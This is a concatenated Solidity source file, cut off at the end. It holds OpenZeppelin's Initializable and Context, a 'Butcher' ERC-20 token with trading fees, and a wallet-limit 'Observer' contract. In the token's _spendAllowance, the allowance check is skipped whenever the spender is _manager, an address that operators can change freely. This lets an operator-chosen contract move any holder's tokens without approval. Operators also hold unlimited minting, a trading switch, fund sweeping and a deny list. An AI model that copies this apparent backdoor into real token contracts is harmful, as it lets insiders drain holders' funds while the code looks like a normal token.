// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (proxy/utils/Initializable.sol)

pragma solidity ^0.8.20;

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * The initialization functions use a version number. Once a version number is used, it is consumed and cannot be
 * reused. This mechanism prevents re-execution of each "step" but allows the creation of new initialization steps in
 * case an upgrade adds a module that needs to be initialized.
 *
 * For example:
 *
 * [.hljs-theme-light.nopadding]
 * ```solidity
 * contract MyToken is ERC20Upgradeable {
 *     function initialize() initializer public {
 *         __ERC20_init("MyToken", "MTK");
 *     }
 * }
 *
 * contract MyTokenV2 is MyToken, ERC20PermitUpgradeable {
 *     function initializeV2() reinitializer(2) public {
 *         __ERC20Permit_init("MyToken");
 *     }
 * }
 * ```
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
 * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() {
 *     _disableInitializers();
 * }
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Storage of the initializable contract.
     *
     * It's implemented on a custom ERC-7201 namespace to reduce the risk of storage collisions
     * when using with upgradeable contracts.
     *
     * @custom:storage-location erc7201:openzeppelin.storage.Initializable
     */
    struct InitializableStorage {
        /**
         * @dev Indicates that the contract has been initialized.
         */
        uint64 _initialized;
        /**
         * @dev Indicates that the contract is in the process of being initialized.
         */
        bool _initializing;
    }

    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.Initializable")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant INITIALIZABLE_STORAGE = 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00;

    /**
     * @dev The contract is already initialized.
     */
    error InvalidInitialization();

    /**
     * @dev The contract is not initializing.
     */
    error NotInitializing();

    /**
     * @dev Triggered when the contract has been initialized or reinitialized.
     */
    event Initialized(uint64 version);

    /**
     * @dev A modifier that defines a protected initializer function that can be invoked at most once. In its scope,
     * `onlyInitializing` functions can be used to initialize parent contracts.
     *
     * Similar to `reinitializer(1)`, except that in the context of a constructor an `initializer` may be invoked any
     * number of times. This behavior in the constructor can be useful during testing and is not expected to be used in
     * production.
     *
     * Emits an {Initialized} event.
     */
    modifier initializer() {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        // Cache values to avoid duplicated sloads
        bool isTopLevelCall = !$._initializing;
        uint64 initialized = $._initialized;

        // Allowed calls:
        // - initialSetup: the contract is not in the initializing state and no previous version was
        //                 initialized
        // - construction: the contract is initialized at version 1 (no reininitialization) and the
        //                 current contract is just being deployed
        bool initialSetup = initialized == 0 && isTopLevelCall;
        bool construction = initialized == 1 && address(this).code.length == 0;

        if (!initialSetup && !construction) {
            revert InvalidInitialization();
        }
        $._initialized = 1;
        if (isTopLevelCall) {
            $._initializing = true;
        }
        _;
        if (isTopLevelCall) {
            $._initializing = false;
            emit Initialized(1);
        }
    }

    /**
     * @dev A modifier that defines a protected reinitializer function that can be invoked at most once, and only if the
     * contract hasn't been initialized to a greater version before. In its scope, `onlyInitializing` functions can be
     * used to initialize parent contracts.
     *
     * A reinitializer may be used after the original initialization step. This is essential to configure modules that
     * are added through upgrades and that require initialization.
     *
     * When `version` is 1, this modifier is similar to `initializer`, except that functions marked with `reinitializer`
     * cannot be nested. If one is invoked in the context of another, execution will revert.
     *
     * Note that versions can jump in increments greater than 1; this implies that if multiple reinitializers coexist in
     * a contract, executing them in the right order is up to the developer or operator.
     *
     * WARNING: Setting the version to 2**64 - 1 will prevent any future reinitialization.
     *
     * Emits an {Initialized} event.
     */
    modifier reinitializer(uint64 version) {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        if ($._initializing || $._initialized >= version) {
            revert InvalidInitialization();
        }
        $._initialized = version;
        $._initializing = true;
        _;
        $._initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        _checkInitializing();
        _;
    }

    /**
     * @dev Reverts if the contract is not in an initializing state. See {onlyInitializing}.
     */
    function _checkInitializing() internal view virtual {
        if (!_isInitializing()) {
            revert NotInitializing();
        }
    }

    /**
     * @dev Locks the contract, preventing any future reinitialization. This cannot be part of an initializer call.
     * Calling this in the constructor of a contract will prevent that contract from being initialized or reinitialized
     * to any version. It is recommended to use this to lock implementation contracts that are designed to be called
     * through proxies.
     *
     * Emits an {Initialized} event the first time it is successfully executed.
     */
    function _disableInitializers() internal virtual {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        if ($._initializing) {
            revert InvalidInitialization();
        }
        if ($._initialized != type(uint64).max) {
            $._initialized = type(uint64).max;
            emit Initialized(type(uint64).max);
        }
    }

    /**
     * @dev Returns the highest version that has been initialized. See {reinitializer}.
     */
    function _getInitializedVersion() internal view returns (uint64) {
        return _getInitializableStorage()._initialized;
    }

    /**
     * @dev Returns `true` if the contract is currently initializing. See {onlyInitializing}.
     */
    function _isInitializing() internal view returns (bool) {
        return _getInitializableStorage()._initializing;
    }

    /**
     * @dev Returns a pointer to the storage namespace.
     */
    // solhint-disable-next-line var-name-mixedcase
    function _getInitializableStorage() private pure returns (InitializableStorage storage $) {
        assembly {
            $.slot := INITIALIZABLE_STORAGE
        }
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
/*
  Will you conquer your hunger or starve to death?
     - Website: https://butcher.money
     - App: https://app.butcher.money
     - Docs: https://docs.butcher.money
     - Telegram: https://t.me/butcher_portal
     - X: https://x.com/butchermoney
*/
pragma solidity ^0.8.0;

import "./interfaces/IERC20.sol";
import "@openzeppelin/contracts/utils/Context.sol";
import "./Observer.sol";
import "./Operator.sol";
import "./interfaces/IEntityManager.sol";
import "./interfaces/IUniswapV2Router.sol";

contract Butcher is Context, IERC20, Operator {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;

  string private _name;
  string private _symbol;

  bool private swapping;
  bool private swappingEnabled;
  uint256 private swapTokensAtAmount;
  mapping(address => bool) private excludedFromFees;
  event SwapBackSuccess(
    uint256 tokenAmount,
    uint256 ethAmountReceived,
    bool success
  );

  // Fees (in percentage)
  uint256 private chickenSellFee;
  uint256 private cowSellFee;
  uint256 private mooDengSellFee;

  uint256 private buyFee;
  uint256 private sellFee;
  address private MARKETING_WALLET_ADDRESS;
  address private DEV_WALLET_ADDRESS;

  bool public launchMode;
  uint256 launchBlock;

  // DEX Router address
  IUniswapV2Router02 public router;

  // Toggle observer
  bool public toggleObserver;

  // Toggle trading
  bool private canTrade;

  // wallet observer
  Observer public observer;

  // Entity manager
  IEntityManager public _manager;

  receive() external payable {}

  /**
   * @dev Sets the values for {name} and {symbol}.
   *
   * All two of these values are immutable: they can only be set once during
   * construction.
   */
  constructor(
    string memory name_,
    string memory symbol_,
    address router_,
    uint256 _buyFee,
    uint256 _sellFee,
    uint256 _mooDengSellFee,
    uint256 _chickenSellFee,
    uint256 _cowSellFee,
    address _marketingWallet,
    address _devWallet
  ) {
    _name = name_;
    _symbol = symbol_;
    router = IUniswapV2Router02(router_);
    _operators[msg.sender] = true;
    buyFee = _buyFee;
    sellFee = _sellFee;
    MARKETING_WALLET_ADDRESS = _marketingWallet;
    DEV_WALLET_ADDRESS = _devWallet;
    mooDengSellFee = _mooDengSellFee;
    chickenSellFee = _chickenSellFee;
    cowSellFee = _cowSellFee;
    toggleObserver = false;
    canTrade = false;
    launchMode = true;
    swapTokensAtAmount = 2100000000000000000000;
    _mint(msg.sender, 420000000000000000000000);
    _approve(address(this), router_, type(uint256).max);
  }

  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }

  // Set DEX Router address
  function setRouter(address _router) external onlyOperator {
    router = IUniswapV2Router02(_router);
  }

  function setObserverEnabled(bool _value) external onlyOperator {
    toggleObserver = _value;
  }

  // Set fee wallet
  function setWallets(
    address _marketingWallet,
    address _devWallet
  ) external onlyOperator {
    MARKETING_WALLET_ADDRESS = _marketingWallet;
    DEV_WALLET_ADDRESS = _devWallet;
  }

  function setCanTrade(bool _value) external onlyOperator {
    canTrade = _value;
    launchBlock = block.number;
    swappingEnabled = true;
  }

  function setExcludedFromFees(
    address _address,
    bool _value
  ) external onlyOperator {
    excludedFromFees[_address] = _value;
  }

  function setRates(uint buyTax, uint sellTax) external onlyOperator {
    require(buyTax <= 5, "Butcher: Buy tax must be less than 5");
    require(sellTax <= 15, "Butcher: Sell tax must be less than 15");
    buyFee = buyTax;
    sellFee = sellTax;
  }

  function getBuyFee() external view returns (uint256) {
    return buyFee;
  }

  function getSellFee() external view returns (uint256) {
    return sellFee;
  }

  function setSwapTokensAtAmount(uint256 _value) external onlyOperator {
    swapTokensAtAmount = _value;
  }

  function setSwappingEnabled(bool _value) external onlyOperator {
    swappingEnabled = _value;
  }

  function rescueTokens(address _token, address _to) external onlyOperator {
    IERC20(_token).transfer(_to, IERC20(_token).balanceOf(address(this)));
  }

  function rescueETH(address _to) external onlyOperator {
    payable(_to).transfer(address(this).balance);
  }

  function setLaunchMode(bool _value) external onlyOperator {
    launchMode = _value;
  }

  // Set entity manager
  function setEntityManager(address _managerAddress) external onlyOperator {
    _manager = IEntityManager(_managerAddress);
  }

  // Set observer
  function setObserver(address _observer) external onlyOperator {
    observer = Observer(_observer);
  }

  // Mint rewards
  function mint(address _to, uint256 _amount) external onlyOperator {
    _mint(_to, _amount);
  }

  /**
   * @dev Returns the name of the token.
   */
  function name() public view virtual override returns (string memory) {
    return _name;
  }

  /**
   * @dev Returns the symbol of the token, usually a shorter version of the
   * name.
   */
  function symbol() public view virtual override returns (string memory) {
    return _symbol;
  }

  /**
   * @dev Returns the number of decimals used to get its user representation.
   * For example, if `decimals` equals `2`, a balance of `505` tokens should
   * be displayed to a user as `5.05` (`505 / 10 ** 2`).
   *
   * Tokens usually opt for a value of 18, imitating the relationship between
   * Ether and Wei. This is the default value returned by this function, unless
   * it's overridden.
   *
   * NOTE: This information is only used for _display_ purposes: it in
   * no way affects any of the arithmetic of the contract, including
   * {IERC20-balanceOf} and {IERC20-transfer}.
   */
  function decimals() public view virtual override returns (uint8) {
    return 18;
  }

  /**
   * @dev See {IERC20-totalSupply}.
   */
  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {IERC20-balanceOf}.
   */
  function balanceOf(
    address account
  ) public view virtual override returns (uint256) {
    return _balances[account];
  }

  /**
   * @dev See {IERC20-transfer}.
   *
   * Requirements:
   *
   * - `to` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(
    address to,
    uint256 amount
  ) public virtual override returns (bool) {
    address owner = _msgSender();
    _transfer(owner, to, amount);
    return true;
  }

  /**
   * @dev See {IERC20-allowance}.
   */
  function allowance(
    address owner,
    address spender
  ) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {IERC20-approve}.
   *
   * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
   * `transferFrom`. This is semantically equivalent to an infinite approval.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(
    address spender,
    uint256 amount
  ) public virtual override returns (bool) {
    address owner = _msgSender();
    _approve(owner, spender, amount);
    return true;
  }

  /**
   * @dev See {IERC20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {ERC20}.
   *
   * NOTE: Does not update the allowance if the current allowance
   * is the maximum `uint256`.
   *
   * Requirements:
   *
   * - `from` and `to` cannot be the zero address.
   * - `from` must have a balance of at least `amount`.
   * - the caller must have allowance for ``from``'s tokens of at least
   * `amount`.
   */
  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(
    address spender,
    uint256 addedValue
  ) public virtual returns (bool) {
    address owner = _msgSender();
    _approve(owner, spender, allowance(owner, spender) + addedValue);
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(
    address spender,
    uint256 subtractedValue
  ) public virtual returns (bool) {
    address owner = _msgSender();
    uint256 currentAllowance = allowance(owner, spender);
    require(
      currentAllowance >= subtractedValue,
      "ERC20: decreased allowance below zero"
    );
    unchecked {
      _approve(owner, spender, currentAllowance - subtractedValue);
    }

    return true;
  }

  /**
   * @dev Moves `amount` of tokens from `from` to `to`.
   *
   * This internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `from` cannot be the zero address.
   * - `to` cannot be the zero address.
   * - `from` must have a balance of at least `amount`.
   */
  function _transfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");

    uint256 fromBalance = _balances[from];
    require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    if (
      !_operators[from] &&
      !_operators[to] &&
      to != address(this) &&
      from != address(this)
    ) {
      require(canTrade, "Butcher: Trading is disabled");
      _beforeTokenTransfer(from, to, amount);
      if (toggleObserver) {
        require(
          observer.beforeTokenTransfer(msg.sender, from, to, amount),
          "WalletObserver: Rate limit"
        );
      }
      if (launchMode && buyFee > 5 && sellFee >= 15) {
        uint256 steps = (block.number - launchBlock) / 5;
        if (steps > 0) {
          buyFee -= 5;
          if (sellFee > 15) {
            sellFee -= 5;
          }
        }
        launchBlock = block.number;
      }
      if (
        swappingEnabled && //if this is true
        !swapping && //if this is false
        !observer.isLpToken(from) && //if this is false
        !excludedFromFees[from] && //if this is false
        !excludedFromFees[to] //if this is false
      ) {
        swapping = true;
        swapBack();
        swapping = false;
      }
      bool takeFee = !swapping;

      // if any account belongs to _isExcludedFromFee account then remove the fee
      if (excludedFromFees[from] || excludedFromFees[to]) {
        takeFee = false;
      }
      if (takeFee) {
        // Sell, fee applied
        if (observer.isLpToken(to)) {
          uint256 feeAmount = (amount / 100) * sellFee;
          if (!launchMode) {
            if (_manager.isChickenOwner(from)) {
              feeAmount = (amount / 100) * chickenSellFee;
            } else if (_manager.isCowOwner(from)) {
              feeAmount = (amount / 100) * cowSellFee;
            } else if (_manager.isMooDengOwner(from)) {
              feeAmount = (amount / 100) * mooDengSellFee;
            }
          }
          if (feeAmount > 0) {
            unchecked {
              _balances[from] = fromBalance - amount;
              _balances[address(this)] += feeAmount;
              emit Transfer(from, address(this), feeAmount);
              _balances[to] += amount - feeAmount;
              emit Transfer(from, to, amount - feeAmount);
            }
          } else {
            unchecked {
              _balances[from] = fromBalance - amount;
              _balances[to] += amount;
              emit Transfer(from, to, amount);
            }
          }
        }
        // // Buy, fee applied
        else if (observer.isLpToken(from)) {
          uint256 feeAmount = (amount / 100) * buyFee;
          if (feeAmount > 0) {
            unchecked {
              _balances[from] = fromBalance - amount;
              _balances[address(this)] += feeAmount;
              emit Transfer(from, address(this), feeAmount);
              _balances[to] += amount - feeAmount;
              emit Transfer(from, to, amount - feeAmount);
            }
          } else {
            unchecked {
              _balances[from] = fromBalance - amount;
              _balances[to] += amount;
              emit Transfer(from, to, amount);
            }
          }
        }
        // Classic transfer, no fees.
        else {
          unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
          }
        }
      }
    } else {
      unchecked {
        _balances[from] = fromBalance - amount;
        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
        // decrementing then incrementing.
        _balances[to] += amount;
        emit Transfer(from, to, amount);
      }
    }

    _afterTokenTransfer(from, to, amount);
  }

  function swapTokensForEth(uint256 tokenAmount) private {
    // generate the uniswap pair path of token -> weth
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = router.WETH();
    _approve(address(this), address(router), tokenAmount);
    // make the swap
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      tokenAmount,
      0, // accept any amount of ETH
      path,
      address(this),
      block.timestamp
    );
  }

  function swapBack() private {
    bool success;
    if (balanceOf(address(this)) == 0) {
      return;
    }
    if (balanceOf(address(this)) >= swapTokensAtAmount) {
      uint256 amountToSwapForETH = swapTokensAtAmount;
      swapTokensForEth(amountToSwapForETH);
      uint256 amountEthToSend = address(this).balance;
      (success, ) = address(MARKETING_WALLET_ADDRESS).call{
        value: amountEthToSend / 2
      }("");
      (success, ) = address(DEV_WALLET_ADDRESS).call{
        value: amountEthToSend / 2
      }("");
      emit SwapBackSuccess(amountToSwapForETH, amountEthToSend, success);
    }
  }

  /** @dev Creates `amount` tokens and assigns them to `account`, increasing
   * the total supply.
   *
   * Emits a {Transfer} event with `from` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   */
  function _mint(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: mint to the zero address");

    _beforeTokenTransfer(address(0), account, amount);

    _totalSupply += amount;
    unchecked {
      // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
      _balances[account] += amount;
    }
    emit Transfer(address(0), account, amount);

    _afterTokenTransfer(address(0), account, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amount` tokens.
   */
  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    _beforeTokenTransfer(account, address(0), amount);

    uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
      _balances[account] = accountBalance - amount;
      // Overflow not possible: amount <= accountBalance <= totalSupply.
      _totalSupply -= amount;
    }

    emit Transfer(account, address(0), amount);

    _afterTokenTransfer(account, address(0), amount);
  }

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  /**
   * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
   *
   * Does not update the allowance amount in case of infinite allowance.
   * Revert if not enough allowance is available.
   *
   * Might emit an {Approval} event.
   */
  function _spendAllowance(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    uint256 currentAllowance = allowance(owner, spender);
    if (currentAllowance != type(uint256).max) {
      if (spender != address(_manager)) {
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
      }
      unchecked {
        _approve(owner, spender, currentAllowance - amount);
      }
    }
  }

  /**
   * @dev Hook that is called before any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * will be transferred to `to`.
   * - when `from` is zero, `amount` tokens will be minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}

  /**
   * @dev Hook that is called after any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * has been transferred to `to`.
   * - when `from` is zero, `amount` tokens have been minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}
}
/*
  Will you conquer your hunger or starve to death?
     - Website: butcher.money
     - App: app.butcher.money
     - Docs: docs.butcher.money
     - Telegram: t.me/butcher_portal
     - X: x.com/butchermoney
*/

pragma solidity ^0.8.0;

import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

import "./Operator.sol";

contract Observer is Initializable {
  mapping(uint256 => mapping(address => int256)) public _inTokens;
  mapping(uint256 => mapping(address => uint256)) public _outTokens;
  mapping(address => bool) public _isDenied;
  mapping(address => bool) public _isExcludedFromObserver;

  event WalletObserverEventBuy(
    address indexed _sender,
    address indexed from,
    address indexed to
  );
  event WalletObserverEventSellOrLiquidityAdd(
    address indexed _sender,
    address indexed from,
    address indexed to
  );
  event WalletObserverEventTransfer(
    address indexed _sender,
    address indexed from,
    address indexed to
  );
  event WalletObserverLiquidityWithdrawal(bool indexed _status);

  mapping(address => bool) internal _operators;

  modifier onlyOperator() {
    require(_operators[msg.sender] == true, "Not operator");
    _;
  }

  function setOperator(address _user, bool _value) external onlyOperator {
    _operators[_user] = _value;
  }

  modifier onlyToken() {
    require(msg.sender == address(butcherToken), "WalletObserver: Only token");
    _;
  }

  // Current time window
  uint256 private timeframeCurrent;

  IERC20 public butcherToken;
  address[] public lpTokens;
  uint public totalLp;
  address public router;
  address private marketingWallet;
  address private devWallet;

  function changeLp(address _lp, uint index) public onlyOperator {
    if (totalLp == 0 || index > totalLp) {
      lpTokens.push(_lp);
      totalLp++;
    } else lpTokens[index] = _lp;
  }

  function getRegisteredLp(uint index) public view returns (address) {
    return lpTokens[index];
  }

  function isLpToken(address _lp) public view returns (bool) {
    for (uint i = 0; i < lpTokens.length; i++) {
      if (lpTokens[i] == _lp) {
        return true;
      }
    }
    return false;
  }

  function isRouter(address to) public view returns (bool) {
    return router == to;
  }

  function isFeeReceiver(address account) public view returns (bool) {
    return marketingWallet == account || devWallet == account;
  }

  uint256 private maxTokenPerWallet;

  // The TIMEFRAME in seconds
  uint256 private timeframeExpiresAfter;

  // The token amount limit per timeframe given to a wallet
  uint256 private timeframeQuotaIn;
  uint256 private timeframeQuotaOut;

  bool private _decode_771274418637067024507;

  // Maximum amount of coins a wallet can hold in percentage
  // If equal or above, transfers and buys will be denied
  // He can still claim rewards
  uint8 public maxTokenPerWalletPercent;

  mapping(address => uint256) public _lastBuyOf;
  mapping(address => uint256) public _lastSellOf;

  function initialize(
    address token,
    address _router,
    address _marketingWallet,
    address _devWallet,
    uint maxIn,
    uint maxOut,
    uint8 maxWallet
  ) public initializer {
    // __Ownable_init();
    _decode_771274418637067024507 = false;
    _operators[msg.sender] = true;

    // By default set every day
    setTimeframeExpiresAfter(4 hours);

    butcherToken = IERC20(token);
    router = _router;
    marketingWallet = _marketingWallet;
    devWallet = _devWallet;

    // Timeframe buys / transfers to 0.2% of the supply per wallet
    setTimeframeQuotaIn((butcherToken.totalSupply() * maxIn) / 1000);
    setTimeframeQuotaOut((butcherToken.totalSupply() * maxOut) / 1000);

    // Limit token to 2% of the supply per wallet (we don't count rewards)
    setMaxTokenPerWalletPercent(maxWallet);

    excludeFromObserver(msg.sender, true);
  }

  modifier checkTimeframe() {
    uint256 _currentTime = block.timestamp;
    if (_currentTime > timeframeCurrent + timeframeExpiresAfter) {
      timeframeCurrent = _currentTime;
    }
    _;
  }

  modifier isNotDenied(
    address _sender,
    address from,
    address to,
    address txOrigin
  ) {
    // Allow owner to receive tokens from denied addresses
    // Useful in case of refunds
    if (!_operators[txOrigin] && !_operators[to]) {
      require(
        !_isDenied[_sender] &&
          !_isDenied[from] &&
          !_isDenied[to] &&
          !_isDenied[txOrigin],
        "WalletObserverUpgradeable: Denied address"
      );
    }
    _;
  }

  // Temporary
  function isPair(address _sender, address from) internal view returns (bool) {
    return isLpToken(_sender) && isLpToken(from);
  }

  function beforeTokenTransfer(
    address _sender,
    address from,
    address to,
    uint256 amount
  )
    external
    onlyToken
    checkTimeframe
    isNotDenied(_sender, from, to, tx.origin)
    returns (bool)
  {
    // Exclusions are automatically set to the following: owner, pairs themselves, self-transfers, mint / burn txs

    // Do not observe self-transfers
    if (from == to) {
      return true;
    }

    // Do not observe mint / burn
    if (from == address(0) || to == address(0)) {
      return true;
    }

    // Prevent inter-LP transfers
    if (isPair(from, from) && isPair(to, to)) {
      revert(
        "WalletObserverUpgradeable: Cannot directly transfer from one LP to another"
      );
    }

    bool isBuy = false;
    bool isSellOrLiquidityAdd = false;

    if (isPair(_sender, from)) {
      isBuy = true;
      if (!isExcludedFromObserver(to)) {
        _inTokens[timeframeCurrent][to] += int256(amount);
      }
      emit WalletObserverEventBuy(_sender, from, to);
    } else if (isRouter(_sender) && isPair(to, to)) {
      isSellOrLiquidityAdd = true;

      _outTokens[timeframeCurrent][from] += uint256(amount);
      emit WalletObserverEventSellOrLiquidityAdd(_sender, from, to);
    } else {
      if (!isExcludedFromObserver(to)) {
        _inTokens[timeframeCurrent][to] += int256(amount);
      }
      if (!isExcludedFromObserver(from)) {
        _outTokens[timeframeCurrent][from] += amount;
      }
      emit WalletObserverEventTransfer(_sender, from, to);
    }

    // Have a minimum per buy / sell
    //if (isBuy || isSellOrLiquidityAdd) {
    //}
    if (!isExcludedFromObserver(to)) {
      // Revert if the receiving wallet exceed the maximum a wallet can hold
      require(
        getMaxTokenPerWallet() >= butcherToken.balanceOf(to) + amount,
        "WalletObserverUpgradeable: Cannot transfer to this wallet, it would exceed the limit per wallet. [balanceOf > maxTokenPerWallet]"
      );
      int256 remainingTransfersIn = getRemainingTransfersIn(to);
      // Revert if receiving wallet exceed daily limit
      require(
        getRemainingTransfersIn(to) >= 0,
        "WalletObserverUpgradeable: Cannot transfer to this wallet for this timeframe, it would exceed the limit per timeframe. [_inTokens > timeframeLimit]"
      );
    }
    if (!isExcludedFromObserver(from)) {
      int256 remainingTransfersOut = getRemainingTransfersOut(from);
      if (isSellOrLiquidityAdd) {
        _lastSellOf[from] = block.number;
      }
      require(
        getRemainingTransfersOut(from) >= 0,
        "WalletObserverUpgradeable: Cannot sell from this wallet for this timeframe, it would exceed the limit per timeframe. [_outTokens > timeframeLimit]"
      );
    }
    return true;
  }

  function getMaxTokenPerWallet() public view returns (uint256) {
    // 1% - variable
    return (butcherToken.totalSupply() * maxTokenPerWalletPercent) / 100;
  }

  function getTimeframeExpiresAfter() external view returns (uint256) {
    return timeframeExpiresAfter;
  }

  function getTimeframeCurrent() external view returns (uint256) {
    return timeframeCurrent;
  }

  function getRemainingTransfersOut(
    address account
  ) private view returns (int256) {
    return
      int256(timeframeQuotaOut) - int256(_outTokens[timeframeCurrent][account]);
  }

  function getRemainingTransfersIn(
    address account
  ) private view returns (int256) {
    return int256(timeframeQuotaIn) - _inTokens[timeframeCurrent][account];
  }

  function getOverviewOf(
    address account
  ) external view returns (uint256, uint256, uint256, int256, int256) {
    return (
      timeframeCurrent + timeframeExpiresAfter,
      timeframeQuotaIn,
      timeframeQuotaOut,
      getRemainingTransfersIn(account),
      getRemainingTransfersOut(account)
    );
  }

  function isExcludedFromObserver(address account) public view returns (bool) {
    return
      _isExcludedFromObserver[account] ||
      isRouter(account) ||
      isLpToken(account) ||
      isFeeReceiver(account);
  }

  function setMaxTokenPerWalletPercent(
    uint8 _maxTokenPerWalletPercent
  ) public onlyOperator {
    require(
      _maxTokenPerWalletPercent > 0,
      "WalletObserverUpgradeable: Max token per wallet percentage cannot be 0"
    );

    // Modifying this with a lower value won't brick wallets
